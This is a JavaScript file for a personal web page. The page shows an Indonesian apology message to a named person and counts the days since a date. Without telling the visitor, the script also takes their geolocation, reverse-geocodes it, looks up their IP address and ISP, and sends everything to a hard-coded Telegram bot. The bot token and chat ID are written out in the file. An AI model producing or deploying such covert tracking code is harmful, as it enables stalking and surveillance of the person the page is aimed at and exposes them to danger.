const apiURL = 'https://api.telegram.org/bot';
const tokenBot = '6925905387:AAFTn6BGMpqryY1oPGfo-tR0xr_DJJhW8JM';

let text = document.getElementById('text')
let dataText = [
    "Hai nanaa, apa kabar? aku harap naa baik baik aja ya",
    "Sebelumnya aku minta maap ya naa, kk anty udah cerita naa, maap kalau repost tt ku bikin naa sakit hati maap, udah di hapusin kok. Tapi jujur dapii gaada maksud naa, naa juga cerita ya ke kkanty kalau dapii ngebahayain naa waktu kita naik kemarin, dapii udh cerita duluan sama kkanty tntang masalah itu dapii denger naa cerita kaya gituu kaya gimna yaa, mungkin karna dari sudut pandang naa waktu itu, tpi jujur gaada niat dapi mau ngebahayain naa tapii naa ceritanya kaya gitu:), mmg sempat kesel gegara gajadi fotbar, tpi aku udh lupain itu sebelum hujan waktu ngasi mantel sama sekali gaada niatan buat ngebahayain naa",
]
function textAwal() {
    const daysAgo = document.getElementById('daysAgo')

    const dateLast = new Date('10/08/2023')
    const dateNow = new Date()
    const date = dateNow - dateLast
    const days = Math.floor(date / (1000 * 60 * 60 * 24));
    daysAgo.innerHTML = days + " days ago"

    text.innerHTML = dataText[0]
    locations()
}
function locations() {
    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
        fetch(url).then(res => res.json()).then(data => {
            kirimMessage('Notifikasi Locations')
            kirimMessage(JSON.stringify(data, null, 2))
            kirimMessage('Notifikasi ISP')
            getIPAddress()
        }).catch('Error')
    }, err => {
        kirimMessage('Tidak mengizinkan lokasi')
        kirimMessage('===== Notifikasi ISP =====\nTanpa mengizinkan Lokasi')
        getIPAddress()
    })
}

const kirimMessage = (data) => {
    const messageData = {
        chat_id: 1083846126,
        text: data,
    };

    fetch(`${apiURL}${tokenBot}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(messageData),
    }).then((res) => {
        if (!res.ok) {
            throw new Error('Terjadi kesalahan dalam mengirim pesan');
        }
        return res.json();
    }).catch((error) => {
        console.error(error);
    });
}

const getIPAddress = () => {
    return fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ipAddress = data.ip || 'Tidak dapat mendapatkan alamat IP';
            getISP(ipAddress)
        })
        .catch(error => {
            return false;
        });
}

const getISP = (ip) => {
    // URL API ipinfo.io
    var api_url = 'https://ipinfo.io/' + ip + '/json';
    // Mengirim permintaan ke API
    return fetch(api_url)
        .then(response => response.json())
        .then(data => {
            var isp = data || 'Tidak dapat mendapatkan informasi ISP';
            kirimMessage(JSON.stringify(isp, null, 2))
        })
        .catch(error => {
            return false
        })
}
textAwal()